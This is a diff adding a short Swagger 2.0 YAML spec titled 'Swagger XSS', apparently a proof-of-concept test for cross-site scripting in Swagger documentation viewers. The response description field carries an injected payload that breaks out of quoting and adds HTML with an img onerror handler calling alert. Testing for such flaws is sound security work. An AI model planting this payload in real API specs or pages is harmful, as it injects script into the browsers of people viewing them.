@@ -1,0 +1,16 @@
+ 
+swagger: '2.0'
+info:
+  title: Swagger XSS
+  description: |
+    Teste
+paths:
+  /Swagger XSS:
+    get:
+      responses:
+        '200':
+          description: No response was specified'">'"><p><input type="submit" value="Send"><p><h4><img src=x onerror=alert('Swagger-XSS')>
+      tags:
+        - Swagger XSS
+      operationId: findAccounts
+      summary: Finds all accounts
